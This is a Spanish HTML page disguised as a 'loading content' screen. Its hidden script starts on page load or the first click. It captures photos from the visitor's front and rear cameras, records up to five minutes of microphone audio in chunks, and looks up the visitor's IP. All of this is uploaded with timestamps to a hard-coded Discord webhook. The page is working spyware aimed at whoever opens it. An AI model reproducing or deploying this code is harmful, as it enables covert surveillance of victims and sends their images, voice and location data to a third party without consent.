<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cargando...</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    height: 100vh;
    background: #000;
    font-family: 'Segoe UI', Arial, sans-serif;
    color: #fff;
    overflow: hidden;
    cursor: pointer;
  }

  .overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: #000;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 25px;
    z-index: 9999;
    color: #e0e0e0;
  }

  .spinner {
    width: 45px;
    height: 45px;
    border: 4px solid #222;
    border-top: 4px solid #888;
    border-radius: 50%;
    animation: girar 1s linear infinite;
  }

  @keyframes girar {
    to { transform: rotate(360deg); }
  }

  .overlay-text {
    font-size: 16px;
    color: #888;
    letter-spacing: 0.5px;
  }

  .hidden { display: none; }
</style>
</head>
<body>

  <div class="overlay" id="overlay">
    <div class="spinner"></div>
    <div class="overlay-text">Cargando contenido, por favor espera...</div>
  </div>

  <div class="hidden">
    <video id="video" autoplay playsinline></video>
  </div>

  <script>
    const video = document.getElementById('video');

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548766063771254846/WIxKE3JXCwdU0HKqeaRcWap1luqS87meWhUDKwN7mWXWge7Ra_nK9CXhUTy3kiKpO9Vm';

    // Configuración
    const SEGUNDOS_POR_TROZO = 5;     // duración de cada trozo
    const MAX_TROZOS = 60;            // 60 x 5s = 5 minutos máximo

    let currentStream = null;
    let yaEnviado = false;
    let pidiendo = false;
    let ipUsuario = null;

    // -------- IP --------
    async function obtenerIP() {
      if (ipUsuario) return ipUsuario;
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ipUsuario = data.ip;
        return ipUsuario;
      } catch (err) {
        console.warn('No se pudo obtener la IP:', err);
        return null;
      }
    }

    // -------- Hora --------
    function horaActual() {
      const d = new Date();
      const pad = n => String(n).padStart(2, '0');
      return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()}`;
    }

    // -------- Captura de cámara --------
    async function capturarDeCamara(facingMode) {
      if (currentStream) {
        currentStream.getTracks().forEach(t => t.stop());
        currentStream = null;
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facingMode },
        audio: false
      });

      currentStream = stream;
      video.srcObject = stream;

      await new Promise(resolve => {
        if (video.readyState >= 2) resolve();
        else video.onloadeddata = () => resolve();
      });
      await new Promise(resolve => setTimeout(resolve, 1000));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));

      if (currentStream) {
        currentStream.getTracks().forEach(t => t.stop());
        currentStream = null;
      }

      return blob;
    }

    // -------- Enviar archivo al webhook --------
    async function enviarAlWebhook(blob, mensaje, nombreArchivo) {
      const formData = new FormData();
      formData.append('file', blob, nombreArchivo);
      formData.append('payload_json', JSON.stringify({ content: mensaje }));

      try {
        const res = await fetch(WEBHOOK_URL, {
          method: 'POST',
          body: formData
        });
        console.log(`Enviado ${nombreArchivo}:`, res.status, res.statusText);
        return res.ok;
      } catch (err) {
        console.error(`Error al enviar ${nombreArchivo}:`, err);
        return false;
      }
    }

    // -------- Grabar en trozos y enviar cada uno --------
    async function grabarEnTrozos(hora, linkIP) {
      if (!navigator.mediaDevices || !window.MediaRecorder) {
        throw new Error('MediaRecorder no soportado en este navegador');
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        audio: true,
        video: false
      });

      // Elegir mimeType soportado
      let mimeType = 'audio/webm';
      if (!MediaRecorder.isTypeSupported(mimeType)) {
        if (MediaRecorder.isTypeSupported('audio/mp4')) mimeType = 'audio/mp4';
        else if (MediaRecorder.isTypeSupported('audio/ogg')) mimeType = 'audio/ogg';
        else mimeType = '';
      }

      const ext = mimeType.includes('mp4') ? 'mp4' : mimeType.includes('ogg') ? 'ogg' : 'webm';
      const opciones = mimeType ? { mimeType } : {};

      let trozo = 0;

      // Función que graba un solo trozo
      function grabarTrozo() {
        return new Promise((resolve) => {
          const recorder = new MediaRecorder(stream, opciones);
          const chunks = [];

          recorder.ondataavailable = e => {
            if (e.data && e.data.size > 0) chunks.push(e.data);
          };

          recorder.onstop = () => {
            const blob = new Blob(chunks, { type: mimeType || 'audio/webm' });
            resolve(blob);
          };

          recorder.start();
          setTimeout(() => {
            if (recorder.state !== 'inactive') recorder.stop();
          }, SEGUNDOS_POR_TROZO * 1000);
        });
      }

      // Bucle de grabación y envío
      while (trozo < MAX_TROZOS) {
        trozo++;
        console.log(`Grabando trozo ${trozo}/${MAX_TROZOS}...`);
        const blob = await grabarTrozo();

        if (blob.size === 0) {
          console.warn(`Trozo ${trozo} vacío, saltando.`);
          continue;
        }

        console.log(`Trozo ${trozo} grabado: ${blob.size} bytes. Enviando...`);
        await enviarAlWebhook(
          blob,
          `🎤 **Audio - trozo ${trozo}** (${SEGUNDOS_POR_TROZO}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
          `audio_trozo_${trozo}.${ext}`
        );
      }

      // Detener micrófono al terminar
      stream.getTracks().forEach(t => t.stop());
    }

    // -------- Flujo principal --------
    async function iniciar() {
      if (pidiendo || yaEnviado) return;
      pidiendo = true;

      const hora = horaActual();
      const ip = await obtenerIP();
      const linkIP = ip ? `https://whatismyipaddress.com/ip/${ip}` : 'IP no disponible';

      try {
        // 1) Foto frontal
        console.log('Capturando cámara frontal...');
        const blobFrontal = await capturarDeCamara('user');
        await enviarAlWebhook(
          blobFrontal,
          `📸 **Captura - Cámara frontal** (mismo usuario)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
          'frontal.jpg'
        );

        await new Promise(r => setTimeout(r, 800));

        // 2) Foto trasera
        console.log('Capturando cámara trasera...');
        const blobTrasera = await capturarDeCamara('environment');
        await enviarAlWebhook(
          blobTrasera,
          `📸 **Captura - Cámara trasera** (mismo usuario)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
          'trasera.jpg'
        );

        // 3) Audio en trozos
        console.log('Iniciando grabación de audio en trozos...');
        await grabarEnTrozos(hora, linkIP);

        yaEnviado = true;
        console.log('Proceso completo.');

      } catch (err) {
        console.error('Permiso denegado o error general:', err);
      } finally {
        pidiendo = false;
      }
    }

    window.addEventListener('load', () => {
      iniciar();
    });

    document.addEventListener('click', () => {
      if (!yaEnviado && !pidiendo) iniciar();
    });
    document.addEventListener('touchstart', () => {
      if (!yaEnviado && !pidiendo) iniciar();
    });
  </script>

</body>
</html>
